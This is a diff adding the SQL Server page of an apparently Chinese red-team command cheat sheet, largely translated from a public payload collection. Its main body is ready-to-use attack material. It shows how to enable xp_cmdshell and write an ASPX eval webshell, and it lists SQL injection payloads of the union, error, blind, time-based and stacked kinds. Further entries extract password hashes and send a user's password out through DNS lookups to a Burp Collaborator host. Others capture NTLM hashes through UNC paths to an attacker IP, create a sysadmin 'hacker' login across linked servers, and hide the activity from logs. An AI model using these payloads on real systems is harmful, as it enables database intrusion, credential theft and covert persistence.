@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <!--
+    The page_title contains the title for a page as shown in the navigation.
+    Site name contains the name as defined in the mkdocs.yml
+  -->
+  <title>sql server - 红队命令速查</title>
+
+  <!-- Page description -->
+  
+
+  <!-- Redirect -->
+  
+
+  <!-- Page author -->
+  
+  <!--
+    Just add a favicon.ico image to the docs.
+  -->
+  <link rel="shortcut icon" href="../../img/favicon.ico">
+
+  <link rel="stylesheet" href="../../css/colors.css">
+  <link rel="stylesheet" href="../../css/bundle.css">
+  <link rel="stylesheet" href="../../css/theme.css">
+  <link media="print" onload="this.media='all'" rel="stylesheet" href="../../css/atom-dark-one.min.css">
+  <!--
+    extra_ess contains paths to CSS files in the users
+    documentation directory or a list of CSS files defined in
+    their mkdocs.yml.
+
+    http://www.mkdocs.org/user-guide/configuration/#extra_css
+  -->
+  
+
+  
+  
+
+  <!--
+    Include Google Analytics tracking code.
+
+    http://www.mkdocs.org/user-guide/configuration/#google_analytics
+  -->
+  
+
+</head>
+
+<body>
+<input id="dark-mode" type="checkbox" />
+<!--
+  The JS has to be loaded here for maximum performance, right after the #dark-mode
+-->
+<script src="../../js/theme.js"></script>
+<div class="app-body">
+  <!-- KPN STYLE Beginning -->
+  <div class="app-layout ">
+    <!-- Top Bar -->
+    <nav class="app-layout__top-bar top-bar">
+      <a class="top-bar__logo" href="https://forum.ywhack.com/command/">
+        <img alt="KPN Logo" src="../../img/logo.svg" />
+      </a>
+      <div class="top-bar__title">红队命令速查</div>
+      <ul class="top-bar__menu">
+        <!--
+          Create a search form that sends the user to the search.html file - this is
+          the other file in the template which adds search to the theme. The only
+          requirement here is that there is a text input with the name 'q' and the
+          action and methods match below.
+        -->
+          <li class="top-bar__item">
+
+            <span role="search" id="search-input-wrapper">
+              <form action="../../search.html" method="get">
+                <input type="text" class="input" id="search-input" name="q" placeholder="Search..." />
+              </form>
+            </span >
+          </li>
+        <!--
+          Versioning support
+        -->
+        
+        <!--
+          Support repo URL
+        -->
+        <li class="top-bar__item">
+          
+        </li>
+
+        <li class="top-bar__item">
+            <label class="top-bar__link" id="label-dark-mode" for="dark-mode" title="Dark mode">
+              <svg alt="dark mode" width="24" height="24">
+                <image xlink:href="../../img/ui-bulb.svg" width="24" height="24"/>
+            </svg>
+            </label>
+        </li>
+        <li class="top-bar__item top-bar__item--trigger"></li>
+
+        <!-- <li class="top-bar__item">
+
+          <a class="top-bar__link top-bar__link--active">Home</a>
+        </li>
+        <li class="top-bar__item"><a class="top-bar__link">Information</a></li>
+        <li class="top-bar__item">
+          <a class="top-bar__link top-bar__link--collapsed">Getting Started</a>
+
+        </li>
+        <li class="top-bar__item top-bar__item--trigger">Menu</li> -->
+      </ul>
+    </nav>
+
+    <!--
+      Create the navigation for the documentation.
+
+      Because we don't know how many levels deep the navigation is, it needs to
+      be included in it's own file so it can be recursive. Otherwise the theme
+      can also only support a specific number of levels.
+
+      See the nav.html file for more details about how this works.
+    -->
+    <nav class="app-layout__side-bar side-bar">
+      <div class="side-bar__action-bar">
+        <a class="side-bar__link" href="/">红队命令速查</a>
+        <!--
+          Versioning support
+        -->
+        
+        <button class="side-bar__close"></button>
+      </div>
+      <ul class="side-bar__menu">
+        
+          <!--
+
+-->
+
+<li>
+  <a href="../.." class="side-bar__link ">
+    介绍
+  </a>
+</li>
+
+
+        
+          <!--
+
+-->
+
+<li>
+  <a href="../../Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/" class="side-bar__link ">
+    Linux 命令速查
+  </a>
+</li>
+
+
+        
+          <!--
+
+-->
+
+<li>
+  <a href="../../Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/" class="side-bar__link ">
+    Windows 命令速查
+  </a>
+</li>
+
+
+        
+          <!--
+
+-->
+
+  <li>
+    <span class="side-bar__link side-bar__link--expanded">
+      工具使用命令速查
+    </span>
+    <ul class="side-bar__sub-menu side-bar__sub-menu--visible">
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../../%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/" class="side-bar__link ">
+    mimikatz
+  </a>
+</li>
+
+
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../../%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/proxy/" class="side-bar__link ">
+    proxy tools
+  </a>
+</li>
+
+
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../../%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/%E5%90%8E%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8/" class="side-bar__link ">
+    后渗透工具列表
+  </a>
+</li>
+
+
+        
+    </ul>
+  </li>
+
+
+        
+          <!--
+
+-->
+
+  <li>
+    <span class="side-bar__link side-bar__link--expanded side-bar__link--active">
+      数据库命令速查
+    </span>
+    <ul class="side-bar__sub-menu side-bar__sub-menu--visible">
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../Oracle/" class="side-bar__link ">
+    oracle
+  </a>
+</li>
+
+
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../mysql/" class="side-bar__link ">
+    mysql
+  </a>
+</li>
+
+
+        
+            <!--
+
+-->
+
+<li>
+  <a href="./" class="side-bar__link side-bar__link--active">
+    sql server
+  </a>
+</li>
+
+
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../postgresql/" class="side-bar__link ">
+    postgresql
+  </a>
+</li>
+
+
+        
+    </ul>
+  </li>
+
+
+        
+      </ul>
+    </nav>
+
+    <!-- MAIN BLOCK -->
+    <main class="app-layout__main main">
+      <div class="app-layout__title-bar title-bar">
+        <div class="title-bar__title" style="font-size: 12px;">sql server</div>
+      </div>
+      
+      <div class="sidebar--secondary hidden-s hidden-xs">
+        <h4>Table of contents</h4>
+        <ul>
+        
+          
+            
+                <li><a class="a" href="#xp_cmdshell">xp_cmdshell</a></li>
+                
+            
+                <li><a class="a" href="#mssql">MSSQL 默认数据库</a></li>
+                
+            
+                <li><a class="a" href="#mssql_1">MSSQL 注释</a></li>
+                
+            
+                <li><a class="a" href="#mssql_2">MSSQL 用户</a></li>
+                
+            
+                <li><a class="a" href="#mssql_3">MSSQL 版本查看</a></li>
+                
+            
+                <li><a class="a" href="#mssql_4">MSSQL 主机名</a></li>
+                
+            
+                <li><a class="a" href="#mssql_5">MSSQL 数据库名</a></li>
+                
+            
+                <li><a class="a" href="#mssql_6">MSSQL 数据库凭证</a></li>
+                
+            
+                <li><a class="a" href="#mssql_7">MSSQL 列出数据库</a></li>
+                
+            
+                <li><a class="a" href="#mssql_8">MSSQL 列出列</a></li>
+                
+            
+                <li><a class="a" href="#mssql_9">MSSQL 列出表</a></li>
+                
+            
+                <li><a class="a" href="#mssql_10">MSSQL 联合注入</a></li>
+                
+            
+                <li><a class="a" href="#mssql_11">MSSQL 报错注入</a></li>
+                
+            
+                <li><a class="a" href="#mssql_12">MSSQL 盲注</a></li>
+                
+            
+                <li><a class="a" href="#mssql_13">MSSQL 时间注入</a></li>
+                
+            
+                <li><a class="a" href="#mssql_14">MSSQL 堆栈查询</a></li>
+                
+            
+                <li><a class="a" href="#mssql_15">MSSQL 读取文件</a></li>
+                
+            
+                <li><a class="a" href="#mssql_16">MSSQL 命令执行</a></li>
+                
+            
+                <li><a class="a" href="#mssql_17">MSSQL 外带数据</a></li>
+                
+                    <li class="child-li"><a class="a child" href="#mssql-dns">MSSQL DNS 外带数据</a></li>
+                
+                    <li class="child-li"><a class="a child" href="#mssql-unc">MSSQL UNC 路径</a></li>
+                
+            
+                <li><a class="a" href="#mssql-db">MSSQL 提升权限为 DB 管理员</a></li>
+                
+            
+                <li><a class="a" href="#mssql_18">MSSQL 受信任链接</a></li>
+                
+            
+                <li><a class="a" href="#_1">列出权限</a></li>
+                
+            
+                <li><a class="a" href="#mssql-opsec">MSSQL OPSEC</a></li>
+                
+            
+                <li><a class="a" href="#references">References</a></li>
+                
+            
+          
+        
+        </ul>
+      </div>
+      
+      <div class="container content-block">
+        <div class="kpn-style">
+          <div class="card">
+            <div class="card__body">
+
+              
+              <h1 id="sql-server">sql server</h1>
+<p>相关工具：</p>
+<ul>
+<li><a href="https://github.com/SafeGroceryStore/MDUT">MDUT</a></li>
+<li><a href="https://github.com/uknowsec/SharpSQLTools">SharpSQLTools</a></li>
+<li><a href="https://github.com/SySS-Research/MAT">MAT</a></li>
+</ul>
+<h2 id="xp_cmdshell">xp_cmdshell</h2>
+<blockquote>
+<p>SQL Server 2005 之前版本，xp_cmdshell 默认开启:</p>
+</blockquote>
+<pre><code>exec master..xp_cmdshell 'whoami';
+</code></pre>
+<blockquote>
+<p>判断是否存在 xp_cmdshell 存储过程，返回1表示存在，否则表示不存在:</p>
+</blockquote>
+<pre><code>select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell';
+</code></pre>
+<blockquote>
+<p>删除 xp_cmdshell:</p>
+</blockquote>
+<pre><code>exec master..sp_dropextendedproc xp_cmdshell;
+</code></pre>
+<blockquote>
+<p>恢复 xp_cmdshell:</p>
+</blockquote>
+<pre><code>exec master..xp_dropextendedproc xp_cmdshell,@dllname='xplog70.dll' declare @o int;
+</code></pre>
+<blockquote>
+<p>SQL Server 2005之后的版本中，xp_cmdshell 默认关闭，需要手动开启，开启xp_cmdshell需要sa权限:</p>
+</blockquote>
+<pre><code># 允许修改高级参数
+exec sp_configure 'show advanced options',1;
+# 配置生效
+RECONFIGURE;
+# 开启xp_cmdshell
+exec sp_configure 'xp_cmdshell',1;
+# 配置生效
+RECONFIGURE;
+# 检查是否开启
+exec sp_configure;
+# 执行系统命令
+exec master..xp_cmdshell 'whoami';
+# 获取webshell
+exec master..xp_cmdshell 'echo  ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\\WWW\\test.aspx'
+</code></pre>
+<h2 id="mssql">MSSQL 默认数据库</h2>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>pubs</td>
+<td>在 MSSQL 2005 中不可用</td>
+</tr>
+<tr>
+<td>model</td>
+<td>在所有版本中可用</td>
+</tr>
+<tr>
+<td>msdb</td>
+<td>在所有版本中可用</td>
+</tr>
+<tr>
+<td>tempdb</td>
+<td>在所有版本中可用</td>
+</tr>
+<tr>
+<td>northwind</td>
+<td>在所有版本中可用</td>
+</tr>
+<tr>
+<td>information_schema</td>
+<td>从 MSSQL 2000 及更高版本开始可用</td>
+</tr>
+</tbody>
+</table>
+<h2 id="mssql_1">MSSQL 注释</h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/* MSSQL Comment */</code></td>
+<td>C-style 注释</td>
+</tr>
+<tr>
+<td><code>-- -</code></td>
+<td>SQL 注释</td>
+</tr>
+<tr>
+<td><code>;%00</code></td>
+<td>Null byte</td>
+</tr>
+</tbody>
+</table>
+<h2 id="mssql_2">MSSQL 用户</h2>
+<pre><code class="language-sql">SELECT CURRENT_USER
+SELECT user_name();
+SELECT system_user;
+SELECT user;
+</code></pre>
+<h2 id="mssql_3">MSSQL 版本查看</h2>
+<pre><code class="language-sql">SELECT @@version
+</code></pre>
+<h2 id="mssql_4">MSSQL 主机名</h2>
+<pre><code class="language-sql">SELECT HOST_NAME()
+SELECT @@hostname
+SELECT @@SERVERNAME
+SELECT SERVERPROPERTY('productversion')
+SELECT SERVERPROPERTY('productlevel')
+SELECT SERVERPROPERTY('edition');
+</code></pre>
+<h2 id="mssql_5">MSSQL 数据库名</h2>
+<pre><code class="language-sql">SELECT DB_NAME()
+</code></pre>
+<h2 id="mssql_6">MSSQL 数据库凭证</h2>
+<ul>
+<li><strong>MSSQL 2000</strong>: Hashcat mode 131: <code>0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578</code>
+    <code>sql
+    SELECT name, password FROM master..sysxlogins
+    SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins 
+    -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer</code></li>
+<li><strong>MSSQL 2005</strong>: Hashcat mode 132: <code>0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe</code>
+    <code>sql
+    SELECT name, password_hash FROM master.sys.sql_logins
+    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins</code></li>
+</ul>
+<h2 id="mssql_7">MSSQL 列出数据库</h2>
+<pre><code class="language-sql">SELECT name FROM master..sysdatabases;
+SELECT DB_NAME(N); — for N = 0, 1, 2, …
+SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; -- Change delimeter value such as ', ' to anything else you want =&gt; master, tempdb, model, msdb   (Only works in MSSQL 2017+)
+</code></pre>
+<h2 id="mssql_8">MSSQL 列出列</h2>
+<pre><code class="language-sql">SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only
+SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable
+
+SELECT table_catalog, column_name FROM information_schema.columns
+</code></pre>
+<h2 id="mssql_9">MSSQL 列出表</h2>
+<pre><code class="language-sql">SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views
+SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;
+SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable
+
+SELECT table_catalog, table_name FROM information_schema.columns
+SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U'; -- Change delimeter value such as ', ' to anything else you want =&gt; trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
+</code></pre>
+<h2 id="mssql_10">MSSQL 联合注入</h2>
+<pre><code class="language-sql">-- extract databases names
+$ SELECT name FROM master..sysdatabases
+[*] Injection
+[*] msdb
+[*] tempdb
+
+-- extract tables from Injection database
+$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
+[*] Profiles
+[*] Roles
+[*] Users
+
+-- extract columns for the table Users
+$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
+[*] UserId
+[*] UserName
+
+-- Finally extract the data
+$ SELECT  UserId, UserName from Users
+</code></pre>
+<h2 id="mssql_11">MSSQL 报错注入</h2>
+<pre><code class="language-sql">For integer inputs : convert(int,@@version)
+For integer inputs : cast((SELECT @@version) as int)
+
+For string inputs   : ' + convert(int,@@version) + '
+For string inputs   : ' + cast((SELECT @@version) as int) + '
+</code></pre>
+<h2 id="mssql_12">MSSQL 盲注</h2>
+<pre><code class="language-sql">AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -
+
+AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
+AND UNICODE(SUBSTRING((SELECT 'A'),1,1))&gt;64-- 
+AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables &gt; 'A'
+
+AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;90
+
+SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'
+
+WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
+SELECT message FROM data WHERE row = 1 and message like 't%'
+</code></pre>
+<h2 id="mssql_13">MSSQL 时间注入</h2>
+<pre><code class="language-sql">ProductID=1;waitfor delay '0:0:10'--
+ProductID=1);waitfor delay '0:0:10'--
+ProductID=1';waitfor delay '0:0:10'--
+ProductID=1');waitfor delay '0:0:10'--
+ProductID=1));waitfor delay '0:0:10'--
+
+IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
+IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
+</code></pre>
+<h2 id="mssql_14">MSSQL 堆栈查询</h2>
+<ul>
+<li>
+<p>Without any statement terminator
+    ```sql
+    -- multiple SELECT statements
+    SELECT 'A'SELECT 'B'SELECT 'C'</p>
+<p>-- updating password with a stacked query
+SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--</p>
+<p>-- using the stacked query to enable xp_cmdshell
+-- you won't have the output of the query, redirect it to a file 
+SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
+```</p>
+</li>
+<li>
+<p>Use a semi-colon ";" to add another query
+    <code>sql
+    ProductID=1; DROP members--</code></p>
+</li>
+</ul>
+<h2 id="mssql_15">MSSQL 读取文件</h2>
+<p><strong>Permissions</strong>: The <code>BULK</code> option requires the <code>ADMINISTER BULK OPERATIONS</code> or the <code>ADMINISTER DATABASE BULK OPERATIONS</code> permission.</p>
+<pre><code class="language-sql">-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
+</code></pre>
+<h2 id="mssql_16">MSSQL 命令执行</h2>
+<pre><code class="language-sql">EXEC xp_cmdshell &quot;net user&quot;;
+EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
+EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
+</code></pre>
+<p>重新激活 xp_cmdshell（在 SQL Server 2005 中默认禁用）</p>
+<pre><code class="language-sql">EXEC sp_configure 'show advanced options',1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+</code></pre>
+<p>与 MSSQL 实例交互。</p>
+<pre><code class="language-powershell">sqsh -S 192.168.1.X -U sa -P superPassword
+python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758
+</code></pre>
+<p>执行 Python 脚本</p>
+<blockquote>
+<p>由与使用 xp_cmdshell 执行命令的用户不同的用户执行</p>
+</blockquote>
+<pre><code class="language-powershell">#Print the user being used (and execute commands)
+EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(&quot;getpass&quot;).getuser())'
+EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(&quot;os&quot;).system(&quot;whoami&quot;))'
+#Open and read a file
+EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open(&quot;C:\\inetpub\\wwwroot\\web.config&quot;, &quot;r&quot;).read())'
+#Multiline
+EXECUTE sp_execute_external_script @language = N'Python', @script = N'
+import sys
+print(sys.version)
+'
+GO
+</code></pre>
+<h2 id="mssql_17">MSSQL 外带数据</h2>
+<h3 id="mssql-dns">MSSQL DNS 外带数据</h3>
+<p>Technique from https://twitter.com/ptswarm/status/1313476695295512578/photo/1</p>
+<pre><code class="language-powershell"># Permissions: Requires VIEW SERVER STATE permission on the server.
+1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
+
+# Permissions: Requires the CONTROL SERVER permission.
+1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))
+1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
+</code></pre>
+<h3 id="mssql-unc">MSSQL UNC 路径</h3>
+<p>MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the <code>xp_dirtree</code> function to list the files in our SMB share and grab the NTLMv2 hash.</p>
+<pre><code class="language-sql">1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
+</code></pre>
+<pre><code class="language-sql">xp_dirtree '\\attackerip\file'
+xp_fileexist '\\attackerip\file'
+BACKUP LOG [TESTING] TO DISK = '\\attackerip\file'
+BACKUP DATABASE [TESTING] TO DISK = '\\attackeri\file'
+RESTORE LOG [TESTING] FROM DISK = '\\attackerip\file'
+RESTORE DATABASE [TESTING] FROM DISK = '\\attackerip\file'
+RESTORE HEADERONLY FROM DISK = '\\attackerip\file'
+RESTORE FILELISTONLY FROM DISK = '\\attackerip\file'
+RESTORE LABELONLY FROM DISK = '\\attackerip\file'
+RESTORE REWINDONLY FROM DISK = '\\attackerip\file'
+RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'
+</code></pre>
+<h2 id="mssql-db">MSSQL 提升权限为 DB 管理员</h2>
+<pre><code class="language-sql">EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
+</code></pre>
+<h2 id="mssql_18">MSSQL 受信任链接</h2>
+<blockquote>
+<p>The links between databases work even across forest trusts.</p>
+</blockquote>
+<pre><code class="language-powershell">msf&gt; use exploit/windows/mssql/mssql_linkcrawler
+[msf&gt; set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter sessio
+</code></pre>
+<p>Manual exploitation</p>
+<pre><code class="language-sql">-- find link
+select * from master..sysservers
+
+-- execute query through the link
+select * from openquery(&quot;dcorp-sql1&quot;, 'select * from master..sysservers')
+select version from openquery(&quot;linkedserver&quot;, 'select @@version as version');
+
+-- chain multiple openquery
+select version from openquery(&quot;link1&quot;,'select version from openquery(&quot;link2&quot;,&quot;select @@version as version&quot;)')
+
+-- execute shell commands
+EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
+select 1 from openquery(&quot;linkedserver&quot;,'select 1;exec master..xp_cmdshell &quot;dir c:&quot;')
+
+-- create user and give admin privileges
+EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT &quot;DOMINIO\SERVER1&quot;') AT &quot;DOMINIO\SERVER2&quot;
+EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT &quot;DOMINIO\SERVER1&quot;') AT &quot;DOMINIO\SERVER2&quot;
+</code></pre>
+<h2 id="_1">列出权限</h2>
+<p>列出当前用户在服务器上的有效权限。</p>
+<pre><code class="language-sql">SELECT * FROM fn_my_permissions(NULL, 'SERVER'); 
+</code></pre>
+<p>列出当前用户在数据库上的有效权限。</p>
+<pre><code class="language-sql">SELECT * FROM fn_my_permissions (NULL, 'DATABASE');
+</code></pre>
+<p>列出当前用户在视图上的有效权限。</p>
+<pre><code>SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; 
+</code></pre>
+<p>检查当前用户是否属于指定的服务器角色。</p>
+<pre><code class="language-sql">-- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin
+SELECT is_srvrolemember('sysadmin');
+</code></pre>
+<h2 id="mssql-opsec">MSSQL OPSEC</h2>
+<p>在查询中使用 <code>SP_PASSWORD</code> 以隐藏日志，如：<code>' AND 1=1--sp_password</code></p>
+<pre><code class="language-sql">-- 'sp_password' was found in the text of this event.
+-- The text has been replaced with this comment for security reasons.
+</code></pre>
+<h2 id="references">References</h2>
+<blockquote>
+<p>注：大部分内容翻译至：<a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a></p>
+</blockquote>
+<ul>
+<li><a href="https://www.cnblogs.com/jerrylocker/p/10938899.html">MSSQL渗透测试</a></li>
+<li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">Pentest Monkey - mssql-sql-injection-cheat-sheet</a></li>
+<li><a href="https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20“Order%20By”%20clause%20(MSSQL).pdf">Error Based - SQL Injection </a></li>
+<li><a href="https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links">MSSQL Trusted Links - HackTricks.xyz</a></li>
+<li><a href="https://blog.netspi.com/how-to-hack-database-links-in-sql-server/">SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6th, 2013</a></li>
+<li><a href="https://github.com/NetSPI/DAFT">DAFT: Database Audit Framework &amp; Toolkit - NetSPI</a></li>
+<li><a href="https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e">SQL Server UNC Path Injection Cheatsheet - nullbind</a></li>
+<li><a href="https://www.exploit-db.com/papers/12975">Full MSSQL Injection PWNage - ZeQ3uL &amp;&amp; JabAv0C - 28 January 2009</a></li>
+<li><a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver15">Microsoft - sys.fn_my_permissions (Transact-SQL)</a></li>
+<li><a href="https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15">Microsoft - IS_SRVROLEMEMBER (Transact-SQL)</a></li>
+<li><a href="https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/">AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice - Marc Olivier Bergeron - Jun 21, 2023</a></li>
+</ul>
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+      <div class="footer__body">
+        
+        <div class="row">
+          <div class="col col--s-4 col--m-3 col--l-2">
+          </div>
+          <div class="col col--s-4 col--m space-between">
+            
+              <a class="footer__link padding-top-0 navigation-prev"
+                href="../mysql/"
+                title="mysql">
+                &#8592; Previous Page
+              </a>
+            
+            
+            
+              <a class="footer__link padding-top-0 navigation-next"
+                href="../postgresql/"
+                title="postgresql"/>
+                Next Page &#8594;
+              </a>
+            
+          </div>
+          <div class="col col--s-4 col--m-3 ">
+          </div>
+        </div>
+        
+      </div>
+    </footer>
+  </div>
+
+
+  <!--
+  MkDocs version      : 1.5.3
+  Docs Build Date UTC : 2024-07-11 13:53:22.957969+00:00
+  -->
+
+  <!--
+    To include static assets from our theme, just add
+    ../.. beforehand which will be the relative path to
+    the root of the documentation.
+  -->
+  <script src="../../js/highlight.min.js"></script>
+  <script src="../../js/languages/groovy.min.js"></script>
+  <script src="../../js/languages/asciidoc.min.js"></script>
+  <script src="../../js/languages/nix.min.js"></script>
+
+  <script>
+    hljs.highlightAll();
+  </script>
+  <script async src="../../js/detail.js"></script>
+  <!--
+    extra_javascript contains paths to JavaScript files in the
+    users documentation directory or a list of JavaScript files
+    defined in their mkdocs.yml.
+
+    http://www.mkdocs.org/user-guide/configuration/#extra_javascript
+  -->
+  
+    <script src="../../search/main.js"></script>
+  
+
+
+  <script>
+  function getMermaidTheme() {
+    if (document.getElementById("dark-mode").checked) {
+      return 'dark'
+    }
+    return 'forest'
+  }
+
+  function initMermaid() {
+    mermaid.initialize({
+      theme: getMermaidTheme(),
+      logLevel: 1,
+    });
+  }
+  var mermaidClass = document.getElementsByClassName('mermaid');
+  if (mermaidClass.length > 0) {
+
+    var mermaidScript = document.createElement('script');
+    mermaidScript.setAttribute("src", "../../js/mermaid.min.js");
+    mermaidScript.setAttribute("async", "false");
+    mermaidScript.setAttribute("type", "text/javascript");
+    mermaidScript.onload = initMermaid;
+    document.body.appendChild(mermaidScript)
+
+  }
+  </script>
+<script>
+  var _hmt = _hmt || [];
+  (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?6c97fbf63dd98317dba802ddddaad905";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+  })();
+  </script>
+  
+</div>
+</body>
+</html>
